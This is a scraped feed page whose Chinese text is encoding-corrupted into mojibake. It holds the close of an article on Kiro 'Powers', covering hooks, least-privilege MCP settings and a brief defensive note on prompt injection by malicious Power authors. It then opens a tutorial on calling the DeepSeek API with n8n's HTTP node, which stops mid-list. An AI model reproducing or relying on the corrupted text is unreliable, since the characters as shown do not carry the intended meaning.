<li><strong>è§¦å‘</strong>ï¼šç”¨æˆ·åœ¨ç¼–è¾‘å™¨ä¸­æ‰“å¼€ <code>k8s/deployment.yaml</code>ã€‚</li>
<li><strong>æ¿€æ´»</strong>ï¼šç”±äºæ–‡ä»¶è·¯å¾„åŒ¹é…å’Œå†…å®¹ï¼ˆåŒ…å« "kind: Deployment"ï¼‰ï¼ŒKiro æ¿€æ´» <code>acme-k8s-deploy</code> Powerã€‚</li>
<li><strong>å¹²é¢„</strong>ï¼šç”¨æˆ·æŒ‰ä¸‹ Ctrl+S ä¿å­˜ã€‚</li>
<li><strong>æ‰§è¡Œ</strong>ï¼š<code>fileSaved</code> é’©å­è§¦å‘ã€‚</li>
<li><strong>åé¦ˆ</strong>ï¼šKiro çš„åå°ä»£ç†è¯»å– <code>POWER.md</code> ä¸­çš„è§„åˆ™ï¼Œåˆ†æåˆšä¿å­˜çš„ YAMLï¼Œå‘ç°ç¼ºå°‘ <code>resources</code> å­—æ®µã€‚</li>
<li><strong>ç»“æœ</strong>ï¼šKiro å¼¹å‡ºæç¤ºï¼šâ€œæ£€æµ‹åˆ°è¿è§„ï¼šç¼ºå°‘èµ„æºé™åˆ¶ã€‚å»ºè®®æ·»åŠ å¦‚ä¸‹é…ç½®...â€ï¼Œå¹¶æä¾›ä¿®å¤ä»£ç ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-28">8. å®‰å…¨æ€§ã€æ²»ç†ä¸æœ€ä½³å®è·µ</h2>
<p>éšç€ Power èµ‹äºˆ AI æ›´å¤šèƒ½åŠ›ï¼Œå®‰å…¨æ€§æ²»ç†å˜å¾—è‡³å…³é‡è¦ã€‚</p>
<h3 data-id="heading-29">8.1 æƒé™éš”ç¦»åŸåˆ™</h3>
<ul>
<li><strong>æœ€å°æƒé™åŸåˆ™ï¼ˆPoLPï¼‰</strong> ï¼šåœ¨ <code>mcp.json</code> ä¸­ï¼Œåº”é»˜è®¤ç¦ç”¨æ‰€æœ‰ç ´åæ€§æ“ä½œï¼Œä»…é€šè¿‡ <code>autoApprove</code> å¼€æ”¾å¿…è¦çš„åªè¯»æ“ä½œã€‚å¯¹äºå†™æ“ä½œï¼Œåº”å§‹ç»ˆä¿ç•™â€œäººæœºå›ç¯ï¼ˆHuman-in-the-Loopï¼‰â€ï¼Œå³è¦æ±‚ç”¨æˆ·ç‚¹å‡»ç¡®è®¤ã€‚</li>
<li><strong>ç¯å¢ƒéš”ç¦»</strong>ï¼šPower åº”èƒ½å¤Ÿè¯†åˆ«å½“å‰ç¯å¢ƒï¼ˆå¼€å‘ vs ç”Ÿäº§ï¼‰ã€‚å¯ä»¥é€šè¿‡è¯»å– <code>NODE_ENV</code> æˆ–ç‰¹å®šçš„ <code>.env</code> å˜é‡ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è‡ªåŠ¨ç¦ç”¨é«˜å± Power æˆ–é’©å­ã€‚</li>
</ul>
<h3 data-id="heading-30">8.2 Power çš„åˆ†å‘ä¸æ›´æ–°</h3>
<ul>
<li><strong>GitOps ç®¡ç†</strong>ï¼šä¼ä¸šåº”å»ºç«‹ä¸€ä¸ªä¸­å¿ƒçš„â€œPower Repositoryâ€ï¼Œæ‰€æœ‰ Power ä½œä¸º Git å­æ¨¡å—åˆ†å‘ç»™å¼€å‘å›¢é˜Ÿã€‚è¿™ç¡®ä¿äº†æ‰€æœ‰äººçš„ <code>POWER.md</code> ä¸­çš„åˆè§„æ€§è§„åˆ™æ˜¯åŒæ­¥æ›´æ–°çš„6ã€‚</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼š<code>mcp.json</code> å¼•ç”¨çš„å·¥å…·ç‰ˆæœ¬åº”é”å®šï¼Œé¿å…å› å¤–éƒ¨å·¥å…·å‡çº§å¯¼è‡´ Power è¡Œä¸ºä¸å¯é¢„æµ‹ã€‚</li>
</ul>
<h3 data-id="heading-31">8.3 é˜²æ­¢æç¤ºè¯æ³¨å…¥ï¼ˆPrompt Injectionï¼‰</h3>
<ul>
<li>ç”±äº Power çš„å†…å®¹ä¼šè¢«æ³¨å…¥åˆ° System Promptï¼Œæ¶æ„çš„ Power ä½œè€…å¯èƒ½ä¼šè¯•å›¾è¦†ç›– AI çš„æ ¸å¿ƒæŒ‡ä»¤ã€‚</li>
<li><strong>é˜²å¾¡</strong>ï¼šKiro å¹³å°å±‚é€šå¸¸ä¼šå¯¹æ³¨å…¥çš„å†…å®¹è¿›è¡Œæ²™ç®±åŒ–å¤„ç†ï¼Œæˆ–è€…åœ¨ System Prompt ä¸­ç»™äºˆ Power ä¸Šä¸‹æ–‡è¾ƒä½çš„ä¼˜å…ˆçº§ï¼Œç¡®ä¿ AI å§‹ç»ˆéµå¾ªæ ¸å¿ƒçš„å®‰å…¨å‡†åˆ™ï¼ˆå¦‚â€œä¸ç”Ÿæˆæœ‰å®³ä»£ç â€ï¼‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-32">9. ç»“è®º</h2>
<p>Kiro Powers å½»åº•æ”¹å˜äº† AI åœ¨ IDE ä¸­çš„è§’è‰²ã€‚å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªâ€œæ›´èªæ˜çš„èŠå¤©æœºå™¨äººâ€ï¼Œè€Œæ˜¯ä¸€ä¸ªåŠ¨æ€çš„ã€ä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„<strong>DevOps ç¼–æ’å¼•æ“</strong>ã€‚</p>
<p>é€šè¿‡å°†çŸ¥è¯†ï¼ˆSteeringï¼‰ã€å·¥å…·ï¼ˆMCPï¼‰å’Œè‡ªåŠ¨åŒ–ï¼ˆHooksï¼‰å°è£…åœ¨æ¨¡å—åŒ–çš„ Power Bundle ä¸­ï¼ŒKiro è§£å†³äº† LLM åœ¨é¢å¯¹åºå¤§æŠ€æœ¯æ ˆæ—¶çš„ä¸Šä¸‹æ–‡è¿‡è½½é—®é¢˜ã€‚ç‰¹åˆ«æ˜¯å…¶ä¸ MCP çš„æ·±åº¦é›†æˆï¼Œä½¿å¾— IDE èƒ½å¤Ÿå®‰å…¨ã€å—æ§åœ°ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’ã€‚</p>
<p>å¯¹äºè¿½æ±‚æè‡´æ•ˆç‡çš„å·¥ç¨‹å›¢é˜Ÿè€Œè¨€ï¼ŒæŒæ¡â€œå¦‚ä½•å°†ç°æœ‰æ–‡æ¡£è‡ªåŠ¨åŒ–è½¬åŒ–ä¸º Powerâ€è¿™ä¸€å…ƒæŠ€èƒ½ï¼Œå°†æ˜¯å°†ç»„ç»‡å†…éƒ¨éšæ€§çŸ¥è¯†æ˜¾æ€§åŒ–ã€å¹¶èµ‹äºˆ AI æ‰§è¡ŒåŠ›çš„å…³é”®æ­¥éª¤ã€‚è¿™æ ‡å¿—ç€è½¯ä»¶å·¥ç¨‹ä»â€œäººå†™ä»£ç â€å‘â€œäººå®šä¹‰è§„åˆ™ï¼ŒAI æ‰§è¡Œä¸å®ˆæŠ¤â€çš„æ™ºèƒ½ä½“æ—¶ä»£çš„è·¨è¶Šã€‚</p>
<h3 data-id="heading-33">é™„å½•ï¼šæ ¸å¿ƒç»„ä»¶ä¸åŠŸèƒ½é€ŸæŸ¥è¡¨</h3>









































<table><thead><tr><th><strong>ç»„ä»¶ (Component)</strong></th><th><strong>æ–‡ä»¶ä½ç½® (Location)</strong></th><th><strong>æ ¸å¿ƒåŠŸèƒ½ (Function)</strong></th><th><strong>å…³é”®è¯­æ³•ç‰¹å¾ (Critical Syntax)</strong></th></tr></thead><tbody><tr><td><strong>Manifest</strong></td><td><code>POWER.md</code></td><td>æ¿€æ´»é€»è¾‘ä¸é¢†åŸŸæ¦‚è¿°</td><td>YAML Frontmatter (<code>keywords</code>, <code>name</code>)</td></tr><tr><td><strong>Tool Config</strong></td><td><code>mcp.json</code></td><td>å·¥å…·è¿æ¥ä¸æƒé™æ§åˆ¶</td><td><code>mcpServers</code> å¯¹è±¡, <code>autoApprove</code> æ•°ç»„</td></tr><tr><td><strong>Steering</strong></td><td><code>steering/*.md</code></td><td>æ·±åº¦ä¸Šä¸‹æ–‡ä¸æœ€ä½³å®è·µ</td><td>æ ‡å‡† Markdown, å¯åˆ†å±‚å¼•ç”¨</td></tr><tr><td><strong>Automation</strong></td><td><code>.kiro/hooks/*.kiro.hook</code></td><td>äº‹ä»¶é©±åŠ¨çš„è‡ªåŠ¨åŒ–æ“ä½œ</td><td>JSON: <code>when</code> (è§¦å‘å™¨), <code>then</code> (åŠ¨ä½œ)</td></tr><tr><td><strong>Prompt Gen</strong></td><td>(AI Generated)</td><td>ä»æ–‡æ¡£è‡ªåŠ¨ç”Ÿæˆé…ç½®</td><td>Meta-Prompting ç­–ç•¥, RAG åˆ†æ</td></tr></tbody></table>
<p>é€šè¿‡åˆ©ç”¨è¿™äº›ç»„ä»¶ï¼Œå¼€å‘è€…å¯ä»¥å°† Kiro ä»ä¸€ä¸ªè¢«åŠ¨çš„ç¼–ç åŠ©æ‰‹è½¬å˜ä¸ºä¸€ä¸ªä¸»åŠ¨çš„ã€å…·å¤‡é¢†åŸŸä¸“é•¿çš„ç»“å¯¹ç¼–ç¨‹ä¸“å®¶ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€n8nã€é€šè¿‡æ¥å…¥DeepSeekäº†è§£HTTPèŠ‚ç‚¹]]></title>    <link>https://juejin.cn/post/7597725815917887529</link>    <guid>https://juejin.cn/post/7597725815917887529</guid>    <pubDate>2026-01-22T02:22:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597725815917887529" data-draft-id="7597746390434512932" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€n8nã€é€šè¿‡æ¥å…¥DeepSeekäº†è§£HTTPèŠ‚ç‚¹"/> <meta itemprop="keywords" content="DeepSeek,AIGC,LLM"/> <meta itemprop="datePublished" content="2026-01-22T02:22:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾·è‚²å¤„ä¸»ä»»"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€n8nã€é€šè¿‡æ¥å…¥DeepSeekäº†è§£HTTPèŠ‚ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾·è‚²å¤„ä¸»ä»»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T02:22:04.000Z" title="Thu Jan 22 2026 02:22:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p>
<blockquote>
<p>æ•´ç†äº†ä¸€ä¸ªn8nå°ä¸“æ ï¼Œæœ‰å…´è¶£çš„å·¥å‹å¯ä»¥å…³æ³¨ä¸€ä¸‹ ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4337364695070801925%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4337364695070801925#wechat_redirect" ref="nofollow noopener noreferrer">ã€Šn8nä¿®ç‚¼æ‰‹å†Œã€‹</a></p>
</blockquote>
<p>åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDAPeojmssNQSyATkwGahIg" target="_blank" title="https://mp.weixin.qq.com/s/DAPeojmssNQSyATkwGahIg" ref="nofollow noopener noreferrer">ã€Šã€n8nã€æ¥å…¥æœ¬åœ°éƒ¨ç½²çš„ DeepSeekã€‹</a>èŠå¤šäº†ï¼ŒæŠŠ DeepSeek å®˜æ–¹æä¾›çš„çº¿ä¸ŠæœåŠ¡ä¹Ÿç”³è¯·äº†ã€‚</p>
<p>åœ¨ä¸“æ çš„å¦ä¸€ç¯‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F_MblQUcHM9ZKK5U3Ro_PaA" target="_blank" title="https://mp.weixin.qq.com/s/_MblQUcHM9ZKK5U3Ro_PaA" ref="nofollow noopener noreferrer">ã€Šã€n8nã€ç¬¬ä¸€ä¸ªå·¥ä½œæµã€‹</a>ç²—ç•¥èŠåˆ° n8n çš„ HTTP èŠ‚ç‚¹ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„èŠ‚ç‚¹ï¼Œå¾ˆå¸¸ç”¨ã€‚</p>
<p>æœ¬æ–‡æƒ³é€šè¿‡å¯¹æ¥ DeepSeek å¹³å°æä¾›çš„æœåŠ¡ï¼Œç”¨ <code>HTTPèŠ‚ç‚¹</code> ä»¿ç…§ <code>AI AgentèŠ‚ç‚¹</code> ï¼Œè®²è§£ä¸€ä¸‹ HTTP èŠ‚ç‚¹çš„è¯¦ç»†ç”¨æ³•ã€‚</p>
<p>é€šè¿‡æœ¬æ–‡ä¹Ÿèƒ½æŒæ¡å¦‚ä½•å¯¹æ¥å…¶ä»–å¤§æ¨¡å‹æä¾›çš„æœåŠ¡ï¼ˆæ¯”å¦‚OpenAIã€æ–‡å¿ƒä¸€è¨€ç­‰ï¼Œéƒ½æ˜¯å·®ä¸å¤šçš„ï¼‰ã€‚</p>
<h2 data-id="heading-0">ç”³è¯· DeepSeek API Key</h2>
<p>ç”³è¯· DeepSeek çš„æœåŠ¡ï¼Œå‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« çš„â€œç®¡ç†å‡­è¯â€ç« èŠ‚å°±å¯ä»¥äº†ï¼Œæœ¬æ–‡å°±ä¸å†å•°å—¦äº†ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDAPeojmssNQSyATkwGahIg" target="_blank" title="https://mp.weixin.qq.com/s/DAPeojmssNQSyATkwGahIg" ref="nofollow noopener noreferrer">ã€Šã€n8nã€æ¥å…¥æœ¬åœ°éƒ¨ç½²çš„ DeepSeekã€‹</a></p>
<p>DeepSeek æä¾›çš„æœåŠ¡æ˜¯éœ€è¦ğŸ’°çš„ï¼Œä½†ç›¸æ¯”èµ·å…¶ä»–å®¶çš„æœåŠ¡ï¼ŒDeepSeek æ˜¯æ¯”è¾ƒä¾¿å®œçš„ã€‚</p>
<p>å…¶ä»–å¹³å°çš„ API Key çš„ç”³è¯·æ–¹æ³•æ˜¯å·®ä¸å¤šçš„ï¼Œä½ å¯ä»¥æœ <code>å¹³å°åç§° + APIå¼€æ”¾å¹³å°</code>ï¼Œé€šå¸¸éƒ½èƒ½æœåˆ°å¯¹åº”çš„æœåŠ¡å…¥å£ã€‚</p>
<h2 data-id="heading-1">åˆ›å»ºå·¥ä½œæµ</h2>
<p>å®Œæˆç›¸å…³æœåŠ¡çš„ç”³è¯·ä¹‹åï¼Œå°±å¯ä»¥æ‰“å¼€ n8n åˆ›å»ºä¸€ä¸ªå·¥ä½œæµäº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85ae9651a64743c19b8f8f303ac72dd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=4bxJJ%2FbqnhAZm3Ou7kOxx%2BYMUig%3D" alt="01.png" loading="lazy"/></p>
<p>æˆ‘å»ºè®®ç»™å·¥ä½œæµèµ·ä¸€ä¸ªæœ‰æ„ä¹‰çš„åå­—ã€‚æ¯”å¦‚ç°åœ¨åœ¨å­¦ä¹ â€œHTTPèŠ‚ç‚¹â€ï¼Œé‚£å°±å«â€œè®¤è¯†HTTPèŠ‚ç‚¹â€ã€‚</p>
<h3 data-id="heading-2">åˆ›å»ºå…³é”®èŠ‚ç‚¹</h3>
<p>DeepSeek å¤§æ¨¡å‹çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯â€œèŠå¤©â€ï¼Œä½ è¾“å‡ºä¸€å¥ï¼Œå®ƒè¿”å›ä¸€å¥ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯åˆ›å»ºä¸€ä¸ªâ€œèŠå¤©èŠ‚ç‚¹â€ã€‚</p>
<p>ç‚¹å‡»å·¥ä½œæµçš„â€œåŠ å·æŒ‰é’®â€ï¼Œåœ¨èŠ‚ç‚¹é¢æ¿é‡Œæœç´¢ <code>chat</code>ï¼Œå°† Chat Trigger èŠ‚ç‚¹ æ·»åŠ åˆ°ç”»å¸ƒé‡Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/145ada6ef65841e3a2a21a9fa15ba596~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=HsZ4HssXpZ%2B20L5%2Bh3f0oYVWgEE%3D" alt="02.png" loading="lazy"/></p>
<p>æ¥ç€ç‚¹å‡» Chat Trigger èŠ‚ç‚¹ å³ä¾§çš„åŠ å·ï¼Œåœ¨èŠ‚ç‚¹é¢æ¿é‡Œæœç´¢ <code>http</code>ï¼Œå°† HTTP Request èŠ‚ç‚¹ æ·»åŠ åˆ°ç”»å¸ƒé‡Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad8f1f602b3f4914a864bd695f59918a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=8lutkkU%2BoQsg3whIHR208sDjSp0%3D" alt="03.png" loading="lazy"/></p>
<p>è¿™æ ·ï¼Œæœ¬æ–‡è¦ç»„è£…çš„å·¥ä½œæµï¼Œè¦ç”¨åˆ°çš„èŠ‚ç‚¹å·²ç»æ‹¼è£…å¥½äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39253ac63a944a2d8cec53207a4cbcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=61IrfB%2FyqqiybfNwB76XE5x4MH8%3D" alt="04.png" loading="lazy"/></p>
<h3 data-id="heading-3">å¯¹æ¥å‚æ•°</h3>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼ŒHTTP Request èŠ‚ç‚¹ä¸Šæœ‰ä¸ªçº¢è‰²æ„Ÿå¹å·å›¾æ ‡ï¼Œå› ä¸ºè¿˜æ²¡ç»™å®ƒé…ç½®æ¥å£åœ°å€ï¼Œæ‰€ä»¥ç°åœ¨æ˜¯æ— æ³•è¿è¡Œçš„ã€‚</p>
<p>æ‰“å¼€ DeepSeek æ¥å£æ–‡æ¡£ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fapi-docs.deepseek.com%2Fzh-cn%2F" target="_blank" title="https://api-docs.deepseek.com/zh-cn/" ref="nofollow noopener noreferrer">api-docs.deepseek.com/zh-cn/</a></p>
<p>å¯ä»¥çœ‹åˆ° DeepSeek å¯¹ä¸€äº›å…³é”®å‚æ•°åšäº†ç®€å•è¯´æ˜ã€‚å…¶ä»–å¤§æ¨¡å‹çš„æ–‡æ¡£ä¸€èˆ¬ä¹Ÿèƒ½åœ¨æœåŠ¡å•†æä¾›çš„åå°é‡Œæ‰¾åˆ°æ–‡æ¡£å…¥å£ã€‚</p>
<p>å›åˆ° n8n è¿™è¾¹ï¼ŒåŒå‡» HTTP Request èŠ‚ç‚¹ï¼Œå¯ä»¥çœ‹åˆ° URL è¿™é¡¹æ˜¯å¿…å¡«çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/522df66962194b3b9485b880cef35abe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=btUN1niD2hxNAYjKWbE6JPBDvEM%3D" alt="05.png" loading="lazy"/></p>
<p>æˆ‘ä»¬åœ¨ DeepSeek å®˜æ–¹æ–‡æ¡£ï¼Œæ‹‰åˆ°é¡µé¢åº•éƒ¨å¯ä»¥çœ‹åˆ°ä¸€æ®µä»£ç ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b41da662d01c4eb599d73a727ea645ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=9szkbiQrO9P%2B%2BwaVifmZrtN%2FB%2F8%3D" alt="06.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çœ‹ <code>curl</code> è¿™è¾¹å°±è¡Œï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é‡Œ <code>curl</code> åé¢è·Ÿç€ä¸€ä¸ªç½‘å€ï¼ˆ<code>https://api.deepseek.com/chat/completions</code>ï¼‰ï¼ŒæŠŠè¿™ä¸ªç½‘å€å¡«å…¥ n8n çš„ HTTP Request èŠ‚ç‚¹çš„ URL é‡Œã€‚</p>
<p>åŒæ—¶ Method è¿™é¡¹æ”¹ä¸º <code>POST</code>ã€‚è¿™æ˜¯è¯·æ±‚æ–¹æ³•ï¼Œæ ¹æ®ä½ ä½¿ç”¨çš„æ¥å£æ¥è°ƒæ•´å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a72c6907dc06460d89795fb22335dc24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=nBL%2B5D9Td2wtMBN3dMwSLAiWYF0%3D" alt="07.png" loading="lazy"/></p>
<p>å†å›åˆ° DeepSeek å®˜æ–¹æ–‡æ¡£æä¾›çš„ä»£ç ï¼Œçœ‹åˆ°æœ‰ä¸¤é¡¹æ˜¯ <code>-H</code> å¼€å¤´çš„ã€‚è¿™ä¸¤é¡¹æ˜¯â€œè¯·æ±‚å¤´â€ã€‚</p>
<ul>
<li><code>Content-Type</code> ï¼šå¿…å¡«é¡¹ï¼è¿™é¡¹ç”¨æ¥å£°æ˜æˆ‘ä»¬å’Œ DeepSeek é€šä¿¡ä½¿ç”¨ä»€ä¹ˆæ ¼å¼ï¼Œ<code>application/json</code> è¡¨ç¤ºæˆ‘ä»¬è¦ä½¿ç”¨ JSON æ ¼å¼è¿›è¡Œé€šä¿¡ã€‚</li>
